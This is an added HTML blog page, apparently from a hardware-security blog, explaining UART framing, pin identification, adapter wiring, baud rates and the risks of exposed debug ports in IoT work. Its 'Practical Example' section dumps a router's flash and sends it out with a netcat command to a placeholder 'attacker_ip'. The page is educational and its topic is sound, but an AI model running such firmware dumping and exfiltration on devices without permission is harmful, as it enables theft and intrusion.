@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UART Communication: A Deep Dive into Serial Protocols | 4mr0</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --bg-primary: #ffffff;
+            --bg-secondary: #f5f5f5;
+            --bg-tertiary: #e8e8e8;
+            --surface-color: #fafafa;
+            --text-primary: #0a0a0a;
+            --text-secondary: #1a1a1a;
+            --text-muted: #6a6a6a;
+            --border-color: #d0d0d0;
+            --border-light: #e0e0e0;
+            --accent: #404040;
+            --font-mono: 'Fira Code', 'Courier New', monospace;
+            --font-sans: 'Inter', 'Roboto', sans-serif;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: var(--font-sans);
+            background-color: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.8;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        header {
+            background-color: var(--text-primary);
+            color: var(--bg-primary);
+            padding: 60px 0 40px;
+        }
+        header h1 {
+            font-family: var(--font-mono);
+            font-size: 2rem;
+            margin-bottom: 0.5rem;
+        }
+        header .meta {
+            color: var(--bg-tertiary);
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+        }
+        header a {
+            color: var(--bg-tertiary);
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+        header a:hover { color: var(--bg-primary); }
+        .content {
+            padding: 60px 0;
+        }
+        .content h2 {
+            font-family: var(--font-mono);
+            font-size: 1.5rem;
+            margin: 40px 0 15px;
+        }
+        .content h3 {
+            font-family: var(--font-mono);
+            font-size: 1.2rem;
+            margin: 30px 0 10px;
+        }
+        .content p {
+            margin-bottom: 1.2rem;
+            color: var(--text-secondary);
+        }
+        .content ul, .content ol {
+            margin-bottom: 1.2rem;
+            padding-left: 25px;
+            color: var(--text-secondary);
+        }
+        .content li { margin-bottom: 0.5rem; }
+        .content pre {
+            background-color: var(--bg-secondary);
+            padding: 20px;
+            border-radius: 8px;
+            overflow-x: auto;
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+            margin-bottom: 1.2rem;
+            border: 1px solid var(--border-light);
+        }
+        .content code {
+            font-family: var(--font-mono);
+            background-color: var(--bg-tertiary);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.85rem;
+        }
+        .content pre code {
+            background: none;
+            padding: 0;
+        }
+        .content .tag {
+            display: inline-block;
+            background-color: var(--bg-tertiary);
+            color: var(--text-secondary);
+            padding: 3px 12px;
+            border-radius: 15px;
+            font-size: 0.75rem;
+            margin-right: 5px;
+            font-family: var(--font-mono);
+        }
+        nav {
+            background-color: var(--bg-secondary);
+            border-bottom: 1px solid var(--border-color);
+            padding: 1rem 0;
+        }
+        nav ul {
+            display: flex;
+            justify-content: center;
+            list-style: none;
+            gap: 20px;
+        }
+        nav a {
+            color: var(--text-primary);
+            text-decoration: none;
+            font-family: var(--font-mono);
+            font-size: 0.9rem;
+        }
+        nav a:hover { color: var(--text-muted); }
+        footer {
+            text-align: center;
+            padding: 40px 0;
+            background-color: var(--text-primary);
+            color: var(--bg-primary);
+        }
+        footer p { color: var(--bg-tertiary); }
+        @media (max-width: 768px) {
+            header h1 { font-size: 1.5rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="container">
+            <p><a href="/blogs"><i class="fas fa-arrow-left"></i> Back to Blogs</a></p>
+            <h1>UART Communication: A Deep Dive into Serial Protocols</h1>
+            <div class="meta">
+                <span><i class="fas fa-calendar"></i> Coming Soon</span>
+                <span><i class="fas fa-tag"></i> Hardware</span>
+            </div>
+        </div>
+    </header>
+
+    <nav>
+        <ul>
+            <li><a href="/">Portfolio</a></li>
+            <li><a href="/blogs">Blogs</a></li>
+        </ul>
+    </nav>
+
+    <article class="content">
+        <div class="container">
+            <h2>Introduction</h2>
+            <p>UART (Universal Asynchronous Receiver/Transmitter) is one of the most fundamental communication protocols in embedded systems. It is the go-to interface for debugging, interacting with sensors, and communicating between microcontrollers. Understanding UART is essential for anyone working with hardware security or IoT device analysis.</p>
+
+            <h2>How UART Works</h2>
+            <p>UART is a serial, asynchronous protocol that transmits data one bit at a time over a single wire (TX for transmit, RX for receive). Unlike protocols like I2C or SPI, UART does not require a shared clock signal. Instead, both devices must agree on a <strong>baud rate</strong> — the speed at which bits are transmitted.</p>
+
+            <p>A standard UART frame consists of:</p>
+            <ul>
+                <li><strong>Start bit</strong> (logic low) — signals the beginning of a frame</li>
+                <li><strong>Data bits</strong> (5 to 9 bits, typically 8) — the actual payload</li>
+                <li><strong>Parity bit</strong> (optional) — basic error checking</li>
+                <li><strong>Stop bit(s)</strong> (logic high) — signals the end of a frame</li>
+            </ul>
+
+            <h2>Identifying UART on a PCB</h2>
+            <p>When performing hardware analysis, UART ports can often be identified by looking for a 4-pin header labelled with some combination of <code>TX</code>, <code>RX</code>, <code>VCC</code>, and <code>GND</code>. If no labels exist, you can probe the pins with a logic analyzer or oscilloscope:</p>
+            <ul>
+                <li><strong>TX</strong> will show activity (toggling) when the device boots</li>
+                <li><strong>RX</strong> is usually idle unless something is sending data to the device</li>
+                <li><strong>VCC</strong> is a steady voltage (typically 3.3V or 5V)</li>
+                <li><strong>GND</strong> is 0V</li>
+            </ul>
+
+            <h2>Connecting to a UART Interface</h2>
+            <p>To interact with a UART interface, you will need a USB-to-UART adapter (such as a Bus Pirate or FTDI cable). The connections are straightforward:</p>
+            <pre><code>Device TX  →  Adapter RX
+Device RX  →  Adapter TX
+Device GND →  Adapter GND</code></pre>
+
+            <p><strong>Important:</strong> Do not connect VCC from the adapter to the device unless you are sure of the voltage requirements. Power the device from its own source.</p>
+
+            <p>Once connected, use a terminal program like <code>screen</code>, <code>minicom</code>, or <code>picocom</code>:</p>
+            <pre><code># Common baud rates to try: 9600, 19200, 38400, 57600, 115200
+screen /dev/ttyUSB0 115200</code></pre>
+
+            <h2>Baud Rate Enumeration</h2>
+            <p>If you do not know the baud rate, you can try common rates manually or use a logic analyzer to measure the bit width. The baud rate can be calculated as:</p>
+            <pre><code>baud_rate = 1 / bit_period</code></pre>
+            <p>Where <code>bit_period</code> is the width of one data bit in seconds. For example, a bit width of 8.68 µs corresponds to approximately 115200 baud.</p>
+
+            <h2>Security Implications</h2>
+            <p>UART interfaces are a common attack vector in IoT security assessments. Manufacturers often leave UART ports accessible on production boards for debugging, which can expose:</p>
+            <ul>
+                <li>Boot logs containing kernel addresses and memory layout</li>
+                <li>Root shell access (via UART console)</li>
+                <li>Firmware update mechanisms</li>
+                <li>Sensitive configuration data</li>
+            </ul>
+
+            <h2>Practical Example</h2>
+            <p>Consider a router that exposes a UART port on the PCB. After identifying the pins and connecting at 115200 baud, the device outputs boot messages and drops into a BusyBox shell with root privileges. From here, you can:</p>
+            <pre><code># cat /proc/mtd
+# dump the firmware flash
+cat /dev/mtd0 > /tmp/firmware.bin
+
+# exfiltrate via netcat
+nc attacker_ip 4444 < /tmp/firmware.bin
+
+# or inspect the filesystem
+mount -t proc proc /proc
+mount -t sysfs sys /sys
+ls /etc/</code></pre>
+
+            <h2>Conclusion</h2>
+            <p>UART is a simple but powerful protocol. For hardware security researchers, it is often the easiest entry point into a device. Recognizing UART pins, connecting at the correct baud rate, and understanding what to do once you get a shell are essential skills for IoT penetration testing.</p>
+
+            <p>In the next article, we will build on this knowledge by exploring JTAG and SWD debug interfaces, which provide even deeper access to embedded devices.</p>
+        </div>
+    </article>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2026 4mr0. Built under pressure.</p>
+        </div>
+    </footer>
+
+</body>
+</html>
